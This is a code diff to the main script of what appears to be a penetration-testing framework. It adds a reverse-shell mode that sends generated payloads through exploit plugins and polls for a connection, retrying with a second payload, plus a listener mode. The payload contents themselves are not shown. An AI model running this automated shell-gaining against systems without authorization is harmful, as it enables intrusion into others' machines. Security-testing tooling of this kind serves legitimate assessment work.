@@ -1,12 +1,17 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 import os
+import socket
 import sys
-from xing.conf import Conf
+import time
+from xing.utils.file import load_file, clear_empty
+from requests.exceptions import ReadTimeout, ConnectionError, ConnectTimeout
 from xing.core import ObjectDict, SubParser
 from xing.core import init_args, PluginType, plugin_runner
 from xing.utils import get_logger, load_plugins, pattern_match
 from xing import utils
+from xing.conf import Conf
+from xing.core.ShellManager import ShellManager
 
 settings = ObjectDict()
 
@@ -76,8 +81,70 @@ def exploit(args):
 
     logger.info("load plugin {} ".format(len(plg_list)))
     for plg in plg_list:
-        logger.info("execute cmd: {}".format(args.cmd))
-        plg.exploit_cmd(target=args.target, cmd=args.cmd)
+        utils.run_exploit_cmd(plg, args)
+
+
+def shell(args):
+    logger = get_logger()
+    supported_plugins = clear_empty(load_file(Conf.SUPPORT_SHELL_PLUGINS_FILE))
+    filter_plugins = load_plugin_by_filter(PluginType.POC,
+                                           args.plugin_name)
+    plg_list = []
+    for plg in filter_plugins:
+        if not getattr(plg, "exploit_cmd", None):
+            continue
+
+        if plg._plugin_name not in supported_plugins:
+            logger.debug('This Plugin Is Not Supported For Reverse Shell')
+            continue
+        plg_list.append(plg)
+
+    logger.info("load plugin {} ".format(len(plg_list)))
+
+    check_sh = ShellManager()
+    if not check_sh.check_service():
+        logger.error('reverse shell platform unavailable')
+        return
+
+    def run_exploit(sh, plg, args):
+        try:
+            utils.run_exploit_cmd(plg, args)
+        except ReadTimeout:
+            logger.debug('ReadTimeOut')
+
+        except socket.timeout:
+            logger.debug('SocketTimeOut')
+
+        except ConnectTimeout:
+            logger.debug('ConnectTimeOut')
+
+        except ConnectionError:
+            logger.debug('ConnectionError')
+
+        except Exception as e:
+            logger.debug(f'Unexpected Error: {str(e)}')
+
+        logger.info("time sleep 3, wait conn")
+        time.sleep(3)
+
+        status = sh.check_connection()
+        if status == "Connected":
+            logger.success("URL: {}".format(sh.conn_url))
+            return True
+
+        return False
+
+    for plg in plg_list:
+        sh = ShellManager()
+        sh.check_port()
+        sh.create_session()
+        payload1 = sh.generate_payload1()
+        args.cmd = payload1
+        if not run_exploit(sh, plg, args):
+            logger.info('Trying Payload2 For Reverse Shell')
+            payload2 = sh.generate_payload2()
+            args.cmd = payload2
+            run_exploit(sh, plg, args)
 
 
 def brute(args):
@@ -108,6 +175,21 @@ def brute(args):
                   targets=load_targets(args.target), concurrency=args.concurrency_count)
 
 
+def listener(args):
+    logger = get_logger()
+    listener_plugins = load_plugin_by_filter(PluginType.LISTENER, args.plugin_name)
+    logger.info(f"load listener with plugin name {args.plugin_name}")
+    plg_list = []
+    for plg in listener_plugins:
+        if not getattr(plg, "listen", None):
+            continue
+        plg_list.append(plg)
+        logger.info(f'loaded plugin: {plg.app_name}')
+        utils.run_listener(plg, args)
+
+    exit()
+
+
 def load_targets(target):
     if os.path.isfile(target):
         return utils.load_file(target)
@@ -135,6 +217,14 @@ def main():
 
     elif args.subparser == SubParser.BRUTE:
         brute(args)
+        sys.exit()
+
+    elif args.subparser == SubParser.LISTENER:
+        listener(args)
+        sys.exit()
+
+    elif args.subparser == SubParser.SHELL:
+        # 不支持
         sys.exit()
 
     else:
